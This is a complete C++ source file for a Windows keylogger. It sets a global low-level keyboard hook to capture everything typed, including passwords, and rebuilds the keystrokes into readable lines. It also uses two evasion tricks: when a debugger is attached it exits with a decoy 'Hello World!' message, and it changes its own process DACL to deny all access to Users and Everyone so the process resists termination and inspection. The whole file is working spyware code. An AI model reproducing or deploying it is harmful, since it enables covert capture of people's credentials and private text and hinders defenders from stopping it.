#include <stdio.h>
#include <Windows.h>
#include <AclApi.h>
#include <iostream>
#include <unordered_map>
///------------------------MACROS-------------------
#define mInfo(msg) wprintf(L"[i] %s\n",msg)
#define mErrorFunction(function,status) wprintf(L"[-] Error: %s returned status/last error %d\n",function,status)
///-------------------------------------------------

BOOL changeACL(void)
{
	///--------------------Get SIDs-----------------
	DWORD dwSizeSidUsers = 0;
	DWORD dwDomainNameUsers = 0;
	SID_NAME_USE snuEverUsers;
	PSID pUsersSID = NULL;
	LPWSTR domainNameUsers=NULL;
	if (!LookupAccountName(NULL,
		L"BUILTIN\\Users",
		NULL,
		&dwSizeSidUsers,
		NULL,
		&dwDomainNameUsers,
		&snuEverUsers) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		mErrorFunction(L"LookupAccountName", GetLastError());
		return FALSE;
	}

	pUsersSID = (PSID) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSizeSidUsers);
	domainNameUsers = (LPWSTR) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDomainNameUsers*sizeof(WCHAR));

	if (!LookupAccountName(NULL,
		L"BUILTIN\\Users",
		pUsersSID,
		&dwSizeSidUsers,
		domainNameUsers,
		&dwDomainNameUsers,
		&snuEverUsers))
	{
		mErrorFunction(L"LookupAccountName", GetLastError());
		HeapFree(GetProcessHeap(), 0, pUsersSID);
		HeapFree(GetProcessHeap(), 0, domainNameUsers);
		return FALSE;
	}

	PSID pEveryoneSID = NULL;
	DWORD sidSize = SECURITY_MAX_SID_SIZE;

	pEveryoneSID = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sidSize);
	if (pEveryoneSID == NULL) {
		mErrorFunction(L"HeapAlloc", GetLastError());
		HeapFree(GetProcessHeap(), 0, pUsersSID);
		HeapFree(GetProcessHeap(), 0, domainNameUsers);
		return FALSE;
	}

	if (!CreateWellKnownSid(WinWorldSid, NULL, pEveryoneSID, &sidSize)) {
		mErrorFunction(L"CreateWellKnownSid", GetLastError());
		HeapFree(GetProcessHeap(), 0, pEveryoneSID);
		HeapFree(GetProcessHeap(), 0, pUsersSID);
		HeapFree(GetProcessHeap(), 0, domainNameUsers);
		return FALSE;
	}

	///------------------END Get SIDs---------------




	///-----------------Make DACL list-----------------
	EXPLICIT_ACCESS ea[2] = {0};
	ea[0].grfAccessPermissions = PROCESS_ALL_ACCESS;
	ea[0].grfAccessMode = DENY_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.ptstrName = (LPWSTR)pUsersSID;

	ea[1].grfAccessPermissions = PROCESS_ALL_ACCESS;
	ea[1].grfAccessMode = DENY_ACCESS;
	ea[1].grfInheritance = NO_INHERITANCE;
	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[1].Trustee.ptstrName = (LPWSTR)pEveryoneSID;

	PACL pDacl = NULL;
	DWORD dwRes = SetEntriesInAcl(2, ea, NULL, &pDacl);
	if (dwRes != ERROR_SUCCESS)
	{
		mErrorFunction(L"SetEntriesInAcl", dwRes);
		HeapFree(GetProcessHeap(), 0, pEveryoneSID);
		HeapFree(GetProcessHeap(), 0, pUsersSID);
		HeapFree(GetProcessHeap(), 0, domainNameUsers);
		return FALSE;
	}
	///-----------------END Make DACL list----------------


	///-----------------Set new DACL-----------------------
	if (ERROR_SUCCESS!=SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pDacl, NULL))
	{
		mErrorFunction(L"SetSecurityInfo", GetLastError());
		HeapFree(GetProcessHeap(), 0, pEveryoneSID);
		HeapFree(GetProcessHeap(), 0, pUsersSID);
		HeapFree(GetProcessHeap(), 0, domainNameUsers);
		LocalFree(pDacl);
		return FALSE;
	}

	mInfo(L"DACL has been modified");
	LocalFree(pDacl);
	HeapFree(GetProcessHeap(), 0, pEveryoneSID);
	HeapFree(GetProcessHeap(), 0, pUsersSID);
	HeapFree(GetProcessHeap(), 0, domainNameUsers);
	return TRUE;
}


/// Predefined values:
#define BACKSPACE 8
#define ENTER 13


std::string buffer;

static std::unordered_map<CHAR, CHAR> symbols = {
		{'1', '!'}, {'2', '@'}, {'3', '#'}, {'4', '$'}, {'5', '%'},
		{'6', '^'}, {'7', '&'}, {'8', '*'}, {'9', '('}, {'0', ')'},
		{'-', '_'}, {'=', '+'}, {'[', '{'}, {']', '}'},
		{'\\', '|'}, {';', ':'}, {'\'', '"'},
		{',', '<'}, {'.', '>'}, {'/', '?'},
		{'`', '~'}
};

LRESULT CALLBACK fKeyLogger(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

		BOOL shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
		BOOL capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
		CHAR symbol = (CHAR)p->vkCode;
		switch (symbol)
		{
		case BACKSPACE:
			if (!buffer.empty())
			{
				buffer.pop_back();
			}
			break;
		case ENTER:
			std::cout << buffer << "\n";
			buffer.clear();
			break;
		default:
			///Letters
			if (symbol>='A' && symbol<='Z')
			{
				if((!capsLockOn && !shiftPressed) ||
					(capsLockOn && shiftPressed))
					symbol += ('a' - 'A');
				buffer.push_back(symbol);
			}
			/// Numberes or other symbols
			else if(symbols.count(symbol)!=0) 
			{
				if (shiftPressed)
				{
					symbol = symbols[symbol];
				}
				buffer.push_back(symbol);
			}
			break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

HHOOK hHook = NULL;

BOOL WINAPI CtrlHandler(DWORD fdwCtrlType)
{
	switch (fdwCtrlType)
	{
	case CTRL_C_EVENT:
		mInfo(L"Closing KeyLogger");
		UnhookWindowsHookEx(hHook);
		ExitProcess(EXIT_SUCCESS);  
		return TRUE;

	case CTRL_CLOSE_EVENT:
		mInfo(L"Closing KeyLogger");
		UnhookWindowsHookEx(hHook);
		ExitProcess(EXIT_SUCCESS);
		return TRUE;

	default:
		return FALSE;
	}
}


int main(void)
{
	if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) {
		mErrorFunction(L"SetConsoleCtrlHandler", GetLastError());
		return EXIT_FAILURE;
	}
	/// Make it harder
	if (IsDebuggerPresent())
	{
		mInfo(L"Hello World!");
		return EXIT_SUCCESS;
	}

	if (!changeACL())
	{
		return EXIT_FAILURE;
	}

	/// Prepare key logger
	hHook=SetWindowsHookEx(WH_KEYBOARD_LL, fKeyLogger, NULL, 0);
	if (hHook == NULL)
	{
		mErrorFunction(L"SetWindowsHookEx", GetLastError());
		return EXIT_FAILURE;
	}

	mInfo(L"Hook has been set");

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return EXIT_SUCCESS;
}